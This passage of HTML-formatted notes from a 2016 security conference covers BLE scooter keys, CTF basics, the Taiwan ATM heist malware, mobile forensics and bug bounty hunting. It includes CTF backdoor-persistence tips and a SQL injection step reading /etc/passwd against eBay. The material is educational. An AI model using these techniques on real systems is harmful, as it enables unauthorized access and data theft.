&lt;li&gt;對，目前是無法被更新的，至於要不要用新的機制，要問 Gogoro。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;HMAC 還是需要一把 Key，但那把存在手機上，還是不能避免外洩囉？  &lt;ul&gt;
&lt;li&gt;對，這邊只是用個 counter 來察覺外洩而已，並沒有要保護那把 Key，因為手機只要有 root 的話，就有外洩的風險。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在 &lt;code&gt;Security_Key&lt;/code&gt; 不能更換的情況下，二手車是否有風險？  &lt;ul&gt;
&lt;li&gt;對，因為不能更換，等於原車主只要有心，還是可以保留 Security Key。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Related Links  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://thinkingiot.blogspot.tw/"&gt;Le IoT  想想物聯網&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Bluetooth_low_energy"&gt;Bluetooth low energy - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/KeeLoq"&gt;KeeLoq - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Introduction to CTF - BambooFox&lt;/h2&gt;
&lt;h3&gt;Speaker: C.K Chen 陳仲寬&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Why attend CTF challenges?  &lt;ul&gt;
&lt;li&gt;The other way for security training  &lt;ul&gt;
&lt;li&gt;CTF as the training for offensive security  &lt;/li&gt;
&lt;li&gt;Emulate real world problems  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Practice your hacking skill  &lt;/li&gt;
&lt;li&gt;Compete with top hackers in the world.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CTF  &lt;ul&gt;
&lt;li&gt;The competition to steal data, a.k.a flag, from other computers  &lt;ul&gt;
&lt;li&gt;EX. Stea admin password from a web server  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Most pobleams are related to real world  &lt;/li&gt;
&lt;li&gt;Good practices for students even experts.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;History of CTF  &lt;ul&gt;
&lt;li&gt;Starting from DEFCON 4 in 1996  &lt;ul&gt;
&lt;li&gt;Format is a mystery  &lt;/li&gt;
&lt;li&gt;Held every year since 1996  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Regions  &lt;ul&gt;
&lt;li&gt;Japan  &lt;ul&gt;
&lt;li&gt;SECCON, TMCTF, MMACTF  &lt;/li&gt;
&lt;li&gt;特別愛出 QR code 的題目  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;South Korea  &lt;ul&gt;
&lt;li&gt;CodeGate, SECUINSIDE  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;China  &lt;ul&gt;
&lt;li&gt;XCTF（聯賽）, BCTF(北京清華), 0CTF（上海交大）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Russia  &lt;ul&gt;
&lt;li&gt;RuCTF  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;France  &lt;ul&gt;
&lt;li&gt;Nuit du Hack CTF  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Malaysia  &lt;ul&gt;
&lt;li&gt;HITB CTF  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Colombia  &lt;ul&gt;
&lt;li&gt;Backdoor CTF  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CTFTime  &lt;/li&gt;
&lt;li&gt;Famous CTF Teams  &lt;ul&gt;
&lt;li&gt;PPP (US, CMU)  &lt;/li&gt;
&lt;li&gt;HITCON (TW)  &lt;/li&gt;
&lt;li&gt;217 (TW, NTU)  &lt;/li&gt;
&lt;li&gt;0ops (China, Shanghai Jiao Tong University)  &lt;/li&gt;
&lt;li&gt;Blue-Lotus (China, Tsinghua University)  &lt;/li&gt;
&lt;li&gt;Dragon Sector (Poland)  &lt;/li&gt;
&lt;li&gt;Gallopsled (Danmark)  &lt;/li&gt;
&lt;li&gt;Shellphish (US, UCSB)  &lt;/li&gt;
&lt;li&gt;DEFKOR (South Korea)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CTF Types  &lt;ul&gt;
&lt;li&gt;JeoPardy 解題型  &lt;ul&gt;
&lt;li&gt;About 90% CTF are held in this type  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Attack &amp;amp; Defense  &lt;ul&gt;
&lt;li&gt;Need good support of networking environment  &lt;/li&gt;
&lt;li&gt;Skill needed  &lt;ul&gt;
&lt;li&gt;Vul discovery and patching  &lt;/li&gt;
&lt;li&gt;Network flow analysis  &lt;/li&gt;
&lt;li&gt;System Administration  &lt;/li&gt;
&lt;li&gt;Backdoor  &lt;ul&gt;
&lt;li&gt;把 process name 改成跟服務的名稱一樣，讓對方不知道要不要砍。  &lt;/li&gt;
&lt;li&gt;用提權的方式放入別人沒辦法砍掉的後門  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Online: iCTF, RuCTF  &lt;/li&gt;
&lt;li&gt;Local: DEFCON Final , HITOCN Final, SECCON Final, XCTF Final, ...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;King of Hill  &lt;ul&gt;
&lt;li&gt;Local: HoneyMe  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Which CTF to Play?  &lt;ul&gt;
&lt;li&gt;For Beginners  &lt;ul&gt;
&lt;li&gt;Backdoor, CSAW Qualificaiton, ASIS  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Advanced  &lt;ul&gt;
&lt;li&gt;DEFCON  &lt;/li&gt;
&lt;li&gt;PladiCTF (hold by PPP)  &lt;/li&gt;
&lt;li&gt;CodeGate (South Korea)  &lt;/li&gt;
&lt;li&gt;SECCON (Japan)  &lt;/li&gt;
&lt;li&gt;PHD Quals  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Expreience Sharing  &lt;ul&gt;
&lt;li&gt;Focus!  &lt;ul&gt;
&lt;li&gt;When you start to CTF, it is best to focus on one type of problem.&lt;br /&gt;
    E.g. Pwn, Reverse, Web  &lt;/li&gt;
&lt;li&gt;只要先讓自己專注於解某一類的題目，壓力比較小。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Following New Techniques  &lt;/li&gt;
&lt;li&gt;Customize Your CTF Toolset  &lt;ul&gt;
&lt;li&gt;Prepare Your own environment  &lt;/li&gt;
&lt;li&gt;E.g., pwntools  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Practice, Practice and Practice  &lt;/li&gt;
&lt;li&gt;Enjoy the Game  &lt;ul&gt;
&lt;li&gt;不要有太大的壓力覺得自己一定要拿多少分數，應該要享受題目，讓自己儘可能從中學到東西。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;神祕議程：黑客搶銀行&lt;/h2&gt;
&lt;h3&gt;Speaker: cclien&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;20160716 上演 ATM Pwn2Own  （第一銀行提款機被搶 8000 萬新台幣）  &lt;/li&gt;
&lt;li&gt;2010 年的 Blackhat 就有 Live Demo 過 ATM 吐鈔票  &lt;/li&gt;
&lt;li&gt;國外有 ATM 被攻擊的案例嗎  &lt;ul&gt;
&lt;li&gt;Backdoor.Tyupkin - 光碟片吐鈔  &lt;/li&gt;
&lt;li&gt;Carbanak APT 內網策動吐鈔  &lt;/li&gt;
&lt;li&gt;Wincor KDIAG32 維護程式吐鈔  &lt;/li&gt;
&lt;li&gt;俄羅斯和烏克蘭那邊很多提款機的維護人員會跳去作黑產賺外快 （？）  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://bankomatchik.ru/"&gt;bankomatchik&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;CDM300.exe&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;CSCWCING.EXE&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;這個論壇是和 ATM 有關的工程師在討論的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;安德魯這個名字在俄羅斯是菜市場名  &lt;/li&gt;
&lt;li&gt;History  &lt;ul&gt;
&lt;li&gt;2013  &lt;ul&gt;
&lt;li&gt;Skimer Trojan  &lt;/li&gt;
&lt;li&gt;Plotus Trojan  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2014  &lt;ul&gt;
&lt;li&gt;Tyupkin Trojan (Russia)  &lt;/li&gt;
&lt;li&gt;Anunak 1.0 犯罪集團  &lt;/li&gt;
&lt;li&gt;Wincor Reg Trojan (Russia)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2015  &lt;ul&gt;
&lt;li&gt;Carbanak 2.0 犯罪集團 (Global)  &lt;/li&gt;
&lt;li&gt;GreenDispenser Trojan (Mexico)  &lt;/li&gt;
&lt;li&gt;SUCEFUL Trojan (Russia)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2016  &lt;ul&gt;
&lt;li&gt;GCMAN Trojan  &lt;/li&gt;
&lt;li&gt;METEL Trojan  &lt;/li&gt;
&lt;li&gt;Anunak 2.0 犯罪集團  &lt;/li&gt;
&lt;li&gt;Wincor CNG Trojan (Taiwan)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DMS 派送機制  &lt;/li&gt;
&lt;li&gt;網路架構圖中，Gateway 為什麼是網路卡？不是 Firewall？猜測是 CISCO 的設備，例如 PIX Firewall  &lt;/li&gt;
&lt;li&gt;吐鈔時間不是寫死的，是用電話與遠端的駭客聯絡，透過遠端協助 telnet 進去 ATM 讓它吐鈔  &lt;/li&gt;
&lt;li&gt;Wincor 的硬體網路上都買得到  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;不同層面的 ATM 後門攻擊方式  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;                          應用軟體層  
                              ||  
                    WOSA/XFS, CEN/XFS 3.0  
                              ||  
OKI SP(硬體) NCR SP   Wincor SP   Hitachi SP   Diebold SP  
                    作業系統 Windows XP/7  
OKI ATM      NCR ATM  Wincor ATM  Hitachi ATM  Diebold ATM  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;ATM 吐鈔程式限定 2016 年 7 月  &lt;ul&gt;
&lt;li&gt;可能因為是集團長期佈署及規劃的活動。  &lt;/li&gt;
&lt;li&gt;可能是買斷的軟體，設定時間後出貨，所以可以賣給其他人，這只是其中一個買家。  &lt;/li&gt;
&lt;li&gt;從程式碼看來，英文用的很正確，程式應該不是俄羅斯人所撰寫。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;{  
    v9 = v20;  
    *(_DWORD *)&amp;amp;SystemTime.wYear = 0;  
    *(_DWORD *)&amp;amp;SystemTime.wDayOfWeek = 0;  
    *(_DWORD *)&amp;amp;SystemTime.wHour = 0;  
    *(_DWORD *)&amp;amp;SystemTime.wSecond = 0;  
    GetSystemTime(&amp;amp;SystemTime);  
    if ( SystemTime.wYear != 2016 || SystemTime.wMonth != 7 || )  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;新聞一直說內鬼，到底有沒有內鬼？  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不太可能是內鬼所為。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;這次破案的關鍵可能在哪？  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;台灣到處都有攝影機的畫面可以調閱。  &lt;/li&gt;
&lt;li&gt;台灣的外國人太少，會特別被注意。尤其到宜蘭吃飯還會被餐廳老闆娘要求合照。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;台灣是鬼島，封鎖機場跟地下匯兌的話，人跟錢都出不去。  &lt;/li&gt;
&lt;li&gt;第一銀行決定把同機型(Wincor PC 1500)通通換掉，有沒有用？  &lt;ul&gt;
&lt;li&gt;典型的「頭痛醫頭，腳痛醫腳。」  &lt;/li&gt;
&lt;li&gt;每一型的 ATM 都有人在討論漏洞  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在場的俄羅斯 Native Speaker 表示：「聽不太懂台灣那位幫安得魯翻譯俄文的女孩講的俄文」  &lt;/li&gt;
&lt;li&gt;最冤枉的就是 ATM，因為不是 ATM 本身的漏洞，是派送機制的管理跟網路管理上的漏洞。  &lt;/li&gt;
&lt;li&gt;真正幕後的 Hacker 並沒有被抓到，抓到的只是車手，只要換一批車手就可以繼續幹一樣的事情，如果能夠透過後續的調查，還原入侵的手法，藉此去防範，才能有效解決這個問題。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Advanced Mobile Device Analysis using JTAG and Chip-Off&lt;/h2&gt;
&lt;h3&gt;Speaker: Kelvin Wong&lt;/h3&gt;
&lt;h4&gt;JTAG&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;What is JTAG  &lt;ul&gt;
&lt;li&gt;Joint Test Action Group  &lt;/li&gt;
&lt;li&gt;Test Access Ports (TAPs) to collect raw data from a memory chips  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Not chip-off and ISP  &lt;ul&gt;
&lt;li&gt;Chip-Off: Remove the chip from the device  &lt;/li&gt;
&lt;li&gt;In-Circular System Programming  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Extreme physical data acquisition  &lt;/li&gt;
&lt;li&gt;Advanced technique  &lt;/li&gt;
&lt;li&gt;Soldering and De-soldering （焊接）  &lt;/li&gt;
&lt;li&gt;JTAG Box  &lt;ul&gt;
&lt;li&gt;Riff BOX  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;JTAG Finder  &lt;/li&gt;
&lt;li&gt;Mounting Frame &amp;amp; Arms  &lt;/li&gt;
&lt;li&gt;TAP  &lt;ul&gt;
&lt;li&gt;TCK: test clock  &lt;/li&gt;
&lt;li&gt;TMS: test mode state  &lt;/li&gt;
&lt;li&gt;TDI: test data in  &lt;/li&gt;
&lt;li&gt;TDO: test data out  &lt;/li&gt;
&lt;li&gt;TRST: test reset  &lt;/li&gt;
&lt;li&gt;NRST: normal reset  &lt;/li&gt;
&lt;li&gt;RTCK: return clock  &lt;/li&gt;
&lt;li&gt;GND: ground  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;JTAG Molex and Jig  &lt;/li&gt;
&lt;li&gt;Demonstration using Riff Box  &lt;ul&gt;
&lt;li&gt;HTC EVO 3G  &lt;/li&gt;
&lt;li&gt;Android OS  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Decoding the Lock Pattern  &lt;ul&gt;
&lt;li&gt;gesture.key  &lt;/li&gt;
&lt;li&gt;20 bytes in length  &lt;/li&gt;
&lt;li&gt;open source tools: Android Pattern Lock Cracker  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Chip-Off&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;What is Chip-Off?  &lt;ul&gt;
&lt;li&gt;eMMC cihp  &lt;/li&gt;
&lt;li&gt;NAND Flash  &lt;/li&gt;
&lt;li&gt;Disassemble &amp;amp; Re-balling  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;eMMC programmer &amp;amp; Adapters  &lt;/li&gt;
&lt;li&gt;eMMC Box  &lt;/li&gt;
&lt;li&gt;EPR BOx &amp;amp; BGA 169e adaptor  &lt;/li&gt;
&lt;li&gt;UFED Physical Analyzer  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Android Compiler Fingerprinting&lt;/h2&gt;
&lt;h3&gt;Speaker: Caleb Fenton, Tim Strazzere&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Android Application Packaging  &lt;ul&gt;
&lt;li&gt;apktool  &lt;/li&gt;
&lt;li&gt;axmlprinter2  &lt;/li&gt;
&lt;li&gt;jeb  &lt;/li&gt;
&lt;li&gt;Reverse with  &lt;ul&gt;
&lt;li&gt;smali / apktool  &lt;/li&gt;
&lt;li&gt;IDA Pro  &lt;/li&gt;
&lt;li&gt;jeb / jeb2  &lt;/li&gt;
&lt;li&gt;androguard  &lt;/li&gt;
&lt;li&gt;enjarify  &lt;/li&gt;
&lt;li&gt;dex2jar + jad/jd  &lt;/li&gt;
&lt;li&gt;jadx  &lt;/li&gt;
&lt;li&gt;radare  &lt;/li&gt;
&lt;li&gt;010Editoer Templates  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;AXML Files  &lt;/li&gt;
&lt;li&gt;DEX Files  &lt;ul&gt;
&lt;li&gt;Dex format is ... flexible  &lt;/li&gt;
&lt;li&gt;Only a few different compilers  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Investigation  &lt;ul&gt;
&lt;li&gt;Built logs of DEX files with different tools  &lt;/li&gt;
&lt;li&gt;Compared files with 010Editor  &lt;/li&gt;
&lt;li&gt;Found some differneces but wanted to know all of them  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Characteristics  &lt;ul&gt;
&lt;li&gt;These may be abnormal  &lt;ul&gt;
&lt;li&gt;Class interfaces  &lt;/li&gt;
&lt;li&gt;Class paths  &lt;/li&gt;
&lt;li&gt;Endian tag  &lt;/li&gt;
&lt;li&gt;Header size  &lt;/li&gt;
&lt;li&gt;Link section  &lt;/li&gt;
&lt;li&gt;String sorting  &lt;/li&gt;
&lt;li&gt;Map type order  &lt;/li&gt;
&lt;li&gt;Section contiguity  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 2 (2016/07/23 Sat)&lt;/h1&gt;
&lt;h2&gt;Bug Bounty 獎金獵人甘苦談 - 那些年我回報過的漏洞&lt;/h2&gt;
&lt;h3&gt;Speaker: Orange Tsai, DEVCORE Consultant&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Slides: &lt;a href="http://blog.orange.tw/2016/07/hitcon-2016-slides-bug-bounty-hunter.html"&gt;http://blog.orange.tw/2016/07/hitcon-2016-slides-bug-bounty-hunter.html&lt;/a&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;What is Bug Bounty Program?  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在官方所提供的規則及範圍下，讓獨立的研究人員可以自由尋找系統漏洞，並提供對等的獎勵。  &lt;ul&gt;
&lt;li&gt;小禮物  &lt;/li&gt;
&lt;li&gt;獎金  &lt;/li&gt;
&lt;li&gt;名譽 (Hall of Fame)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Bug Bounty 的好處？  &lt;ul&gt;
&lt;li&gt;防止漏洞流入地下市場  &lt;/li&gt;
&lt;li&gt;企業架構大難顧及網路邊界時，Bug Bounty 可以邀請更多人來測試產品的漏洞  &lt;/li&gt;
&lt;li&gt;企業對外形象宣傳：告訴社會大眾重視資安，吸引資安高手  &lt;/li&gt;
&lt;li&gt;改善社會不良風氣：告訴駭客們有更簡單的方式可以做好事  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;哪些企業已經有 Bug Bounty?  &lt;ul&gt;
&lt;li&gt;1995: Netscape  &lt;/li&gt;
&lt;li&gt;2010: Google  &lt;/li&gt;
&lt;li&gt;2011: Facebook  &lt;/li&gt;
&lt;li&gt;2013: Microsoft, Yahoo  &lt;/li&gt;
&lt;li&gt;2014: Twitter  &lt;/li&gt;
&lt;li&gt;2015: Line  &lt;/li&gt;
&lt;li&gt;2016: Uber, Spotify, Uber, Pornhub (今年 5 月開始)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The Internet Bug Bounty  &lt;ul&gt;
&lt;li&gt;為了維護網路世界的和平，獎勵那些找出可以影響整個網路世界弱點的英雄們  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Bug Bounty 成效  &lt;ul&gt;
&lt;li&gt;Google  &lt;ul&gt;
&lt;li&gt;6 Million  &lt;/li&gt;
&lt;li&gt;750+ bugs in 2015  &lt;/li&gt;
&lt;li&gt;300+ hackrs in 2015  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Facebook  &lt;ul&gt;
&lt;li&gt;4.2 Million  &lt;/li&gt;
&lt;li&gt;526 bugs in 2015  &lt;/li&gt;
&lt;li&gt;210 hackers in 2015  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Yahoo  &lt;ul&gt;
&lt;li&gt;1.6 Million  &lt;/li&gt;
&lt;li&gt;2500+ bugs in 2015  &lt;/li&gt;
&lt;li&gt;3000+ hackers in 2015  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Bug Bounty 平台  &lt;ul&gt;
&lt;li&gt;bugcrowd  &lt;/li&gt;
&lt;li&gt;hackerone  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;參加 Bug Bounty 前的準備  &lt;ul&gt;
&lt;li&gt;為了什麼參加  &lt;ul&gt;
&lt;li&gt;獎金？  &lt;/li&gt;
&lt;li&gt;名譽？  &lt;/li&gt;
&lt;li&gt;練功？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;對於尋找漏洞的心理準備  &lt;ul&gt;
&lt;li&gt;雖然今非昔比，但要告訴自己一定會有洞  &lt;/li&gt;
&lt;li&gt;Bug Bounty 的藍海時期大約是 2013 ~ 2014 年  &lt;/li&gt;
&lt;li&gt;大公司的主機架構到了一定的規模，一定會有漏網之魚。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;常見弱點的理解  &lt;ul&gt;
&lt;li&gt;SQL Injection  &lt;/li&gt;
&lt;li&gt;XSS  &lt;/li&gt;
&lt;li&gt;CSRF  &lt;/li&gt;
&lt;li&gt;XML External Entity  &lt;/li&gt;
&lt;li&gt;Local File Inclusion  &lt;/li&gt;
&lt;li&gt;CSV Macro Injection  &lt;/li&gt;
&lt;li&gt;XSLT Injection  &lt;/li&gt;
&lt;li&gt;SVG/XML XSS  &lt;/li&gt;
&lt;li&gt;RPO Gadget  &lt;/li&gt;
&lt;li&gt;Subdomain reaver  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;資訊的蒐集方法  &lt;ul&gt;
&lt;li&gt;DNS 與 網路邊界  &lt;ul&gt;
&lt;li&gt;子域名？相鄰域名？內部域名？  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;uberinternal.com&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;twtter.com&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;etonreve.com&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Whois? R-Whois?  &lt;/li&gt;
&lt;li&gt;併購服務  &lt;ul&gt;
&lt;li&gt;Google 的 6 個月規則：併購服務 6 個月內出現的漏洞不給獎金  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Port Scanning  &lt;ul&gt;
&lt;li&gt;Facebook Jenkins RCE by Dewhurst Security  &lt;/li&gt;
&lt;li&gt;Pornhub Memcached Unauthenticated Access by @ZephrFish  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;小案例  &lt;ul&gt;
&lt;li&gt;Yahoo! Yapache  &lt;ul&gt;
&lt;li&gt;Yahoo 自己 Patch 的 Apache，在當時也算是個創舉  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;https://login.yahoo.com/bin/hostname&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SSL 憑證不安全  &lt;ul&gt;
&lt;li&gt;可以去看憑證的內容有什麼  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;參加 Bug Bounty 注意事項  &lt;ul&gt;
&lt;li&gt;規則所允許範圍  &lt;ul&gt;
&lt;li&gt;範圍外就無法嘗試嗎？  &lt;ul&gt;
&lt;li&gt;多多少少還是會收一下，但不收的話廠商並沒有錯。  &lt;/li&gt;
&lt;li&gt;不要找錯目標，不然會浪費自己和廠商的時間。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;規則所允許限度  &lt;ul&gt;
&lt;li&gt;Instagram's Million Dollar Bug by Wesley  &lt;ul&gt;
&lt;li&gt;回報了漏洞之後，卻做了進一步的滲透測試，拿到 AWS key，進到 S3 bucket，拿到 Instagram 的 source code  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;不要丟不符合規定的漏洞  &lt;ul&gt;
&lt;li&gt;別踏入榮譽感的誤區  &lt;/li&gt;
&lt;li&gt;常見不符合規定的例子：  &lt;ul&gt;
&lt;li&gt;SELF XSS  &lt;/li&gt;
&lt;li&gt;Information Leakage  &lt;/li&gt;
&lt;li&gt;Cookie without Secure Flage or HttpOnly  &lt;/li&gt;
&lt;li&gt;Logout CSRF  &lt;/li&gt;
&lt;li&gt;Content Injection  &lt;/li&gt;
&lt;li&gt;More ...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Facebook 去年有一萬多筆回報，但只有五百多筆是真正有效的漏洞回報  &lt;/li&gt;
&lt;li&gt;2014 Google VRP 回報狀況，很大的比例是沒有用的回報  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;撰寫報告的禮節  &lt;ul&gt;
&lt;li&gt;明確的標題及描述  &lt;/li&gt;
&lt;li&gt;附上驗證程式碼及截圖  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;尋找漏洞的思路  &lt;ul&gt;
&lt;li&gt;有做功課的 Bonus  &lt;ul&gt;
&lt;li&gt;Facebook Onavo Dom-Based XSS  &lt;ul&gt;
&lt;li&gt;2014/03/16 Onavo Reflected XSS by Mazin Ahmed  &lt;/li&gt;
&lt;li&gt;2014/05/01 Facebook fixed it  &lt;/li&gt;
&lt;li&gt;One day, Facebook revised it... Buggy again!  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;eBay SQL Injection  &lt;ul&gt;
&lt;li&gt;列舉 eBay.com 時某台主機反查到 &lt;code&gt;eBayc3.com&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;根據 WHOIS 確認為 eBay Inc. 所擁有無誤  &lt;/li&gt;
&lt;li&gt;列舉 eBayc3.com  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;images.ebayc3.com&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;連貓都會的 SQL Injection  &lt;ul&gt;
&lt;li&gt;嘗試可否 RCE  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;嘗試讀檔  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;CREATE TABLE test (src TEXT);&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE \&lt;/code&gt;test`;`  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
